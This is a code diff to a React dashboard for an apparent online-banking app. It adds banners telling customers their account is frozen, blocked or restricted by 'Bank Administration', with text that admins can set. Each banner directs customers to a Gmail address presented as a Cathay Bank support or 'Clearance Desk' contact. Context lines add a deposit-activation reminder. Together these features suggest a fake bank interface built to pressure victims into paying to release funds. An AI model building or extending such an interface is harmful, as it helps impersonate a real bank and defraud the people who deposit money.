@@ -7,7 +7,8 @@ import {
     Search, ShieldCheck, CreditCard, ChevronRight, Send, FileText, 
     CheckCircle2, Clock, Lock, RefreshCw, SlidersHorizontal, ChevronDown, ChevronUp,
     ArrowUpRight, ArrowDownLeft, Shield, LogOut, Check, Plane, MoreHorizontal,
-    Globe, TrendingUp, Building2, Award, Sparkles, Coins, HelpCircle, AlertCircle, History, RotateCcw
+    Globe, TrendingUp, Building2, Award, Sparkles, Coins, HelpCircle, AlertCircle, History, RotateCcw,
+    Snowflake, Ban, ShieldAlert, ShieldX
 } from 'lucide-react';
 import { generateReceiptPDF } from '../utils/pdfGenerator';
 import CryptoAssetsSection from './CryptoAssets';
@@ -262,6 +263,107 @@ const Dashboard: React.FC = () => {
 
             {/* 2. ACCOUNT CARDS SECTION */}
             <div className="px-5 -mt-4 relative z-20 space-y-3">
+                {/* Account Frozen Status Notice */}
+                {(user?.isFrozen || user?.accountStatus === 'frozen') && (
+                    <div id="customer-frozen-banner" className="bg-gradient-to-r from-sky-950/95 via-cyan-950/95 to-blue-950/95 border-2 border-cyan-400/80 text-white rounded-2xl p-4 shadow-xl backdrop-blur-md animate-in fade-in duration-300">
+                        <div className="flex items-start gap-3.5">
+                            <div className="w-11 h-11 rounded-xl bg-cyan-500/20 border border-cyan-400/50 text-cyan-300 flex items-center justify-center shrink-0 shadow-inner">
+                                <Snowflake className="w-6 h-6 animate-pulse" />
+                            </div>
+                            <div className="flex-1 min-w-0">
+                                <div className="flex items-center justify-between gap-2 mb-1.5 flex-wrap">
+                                    <div className="flex items-center gap-2">
+                                        <span className="flex h-2.5 w-2.5 relative">
+                                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
+                                            <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-cyan-500"></span>
+                                        </span>
+                                        <h4 className="text-xs font-black uppercase text-cyan-200 tracking-wider">
+                                            Account Frozen
+                                        </h4>
+                                    </div>
+                                    <span className="text-[9px] font-black uppercase bg-cyan-500/20 border border-cyan-400/40 text-cyan-200 px-2.5 py-0.5 rounded-full">
+                                        Administrative Hold
+                                    </span>
+                                </div>
+                                <p className="text-xs text-cyan-100/90 font-medium leading-relaxed">
+                                    {user?.freezeMessage || user?.transferFreezeMessage || "This account is frozen by Bank Administration. Transfers, outgoing wires, and card payments are temporarily locked until enabled by administration."}
+                                </p>
+                                <div className="mt-2.5 pt-2 border-t border-cyan-500/20 flex items-center justify-between text-[10px] text-cyan-300/80 font-bold flex-wrap gap-2">
+                                    <span>Direct Resolution Desk: supportcathaybankusa@gmail.com</span>
+                                    <span className="font-mono uppercase">Ref: #FRZ-{user?.accountNumber || 'AUTH'}</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                )}
+
+                {/* Account Blocked Status Notice */}
+                {(user?.isBlocked || user?.accountStatus === 'blocked') && (
+                    <div id="customer-blocked-banner" className="bg-gradient-to-r from-red-950/95 via-rose-950/95 to-slate-950/95 border-2 border-red-500/80 text-white rounded-2xl p-4 shadow-xl backdrop-blur-md animate-in fade-in duration-300">
+                        <div className="flex items-start gap-3.5">
+                            <div className="w-11 h-11 rounded-xl bg-red-500/20 border border-red-400/50 text-red-400 flex items-center justify-center shrink-0 shadow-inner">
+                                <Ban className="w-6 h-6" />
+                            </div>
+                            <div className="flex-1 min-w-0">
+                                <div className="flex items-center justify-between gap-2 mb-1.5 flex-wrap">
+                                    <div className="flex items-center gap-2">
+                                        <span className="flex h-2.5 w-2.5 relative">
+                                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                                            <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
+                                        </span>
+                                        <h4 className="text-xs font-black uppercase text-red-200 tracking-wider">
+                                            Account Blocked
+                                        </h4>
+                                    </div>
+                                    <span className="text-[9px] font-black uppercase bg-red-500/20 border border-red-400/40 text-red-200 px-2.5 py-0.5 rounded-full">
+                                        Security Suspension
+                                    </span>
+                                </div>
+                                <p className="text-xs text-red-100/90 font-medium leading-relaxed">
+                                    {user?.blockMessage || "This account has been blocked by Bank Administration. Access to online banking operations is suspended until enabled by administration."}
+                                </p>
+                                <div className="mt-2.5 pt-2 border-t border-red-500/20 flex items-center justify-between text-[10px] text-red-300/80 font-bold flex-wrap gap-2">
+                                    <span>Security Support: supportcathaybankusa@gmail.com</span>
+                                    <span className="font-mono uppercase">Ref: #BLK-{user?.accountNumber || 'AUTH'}</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                )}
+
+                {/* Account Restricted Status Notice */}
+                {(user?.isRestricted || user?.accountStatus === 'restricted') && (
+                    <div id="customer-restricted-banner" className="bg-gradient-to-r from-amber-950/95 via-orange-950/95 to-slate-950/95 border-2 border-amber-500/80 text-white rounded-2xl p-4 shadow-xl backdrop-blur-md animate-in fade-in duration-300">
+                        <div className="flex items-start gap-3.5">
+                            <div className="w-11 h-11 rounded-xl bg-amber-500/20 border border-amber-400/50 text-amber-400 flex items-center justify-center shrink-0 shadow-inner">
+                                <ShieldAlert className="w-6 h-6" />
+                            </div>
+                            <div className="flex-1 min-w-0">
+                                <div className="flex items-center justify-between gap-2 mb-1.5 flex-wrap">
+                                    <div className="flex items-center gap-2">
+                                        <span className="flex h-2.5 w-2.5 relative">
+                                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
+                                            <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-amber-500"></span>
+                                        </span>
+                                        <h4 className="text-xs font-black uppercase text-amber-200 tracking-wider">
+                                            Account Restricted
+                                        </h4>
+                                    </div>
+                                    <span className="text-[9px] font-black uppercase bg-amber-500/20 border border-amber-400/40 text-amber-200 px-2.5 py-0.5 rounded-full">
+                                        Administrative Restriction
+                                    </span>
+                                </div>
+                                <p className="text-xs text-amber-100/90 font-medium leading-relaxed">
+                                    {user?.restrictionMessage || "This account is subject to administrative restrictions. Outgoing transfers and wires are placed on security hold until enabled by administration."}
+                                </p>
+                                <div className="mt-2.5 pt-2 border-t border-amber-500/20 flex items-center justify-between text-[10px] text-amber-300/80 font-bold flex-wrap gap-2">
+                                    <span>Clearance Desk: supportcathaybankusa@gmail.com</span>
+                                    <span className="font-mono uppercase">Ref: #RST-{user?.accountNumber || 'AUTH'}</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                )}
                 {/* Account Initial Deposit & Activation Reminder Banner */}
                 {user && user.balance === 0 && !user.name?.toLowerCase().includes('james michael') && (
                     <div className="bg-gradient-to-r from-amber-500/20 via-amber-500/10 to-orange-500/20 border-2 border-amber-500/40 dark:border-amber-400/40 rounded-2xl p-4 shadow-md backdrop-blur-md">
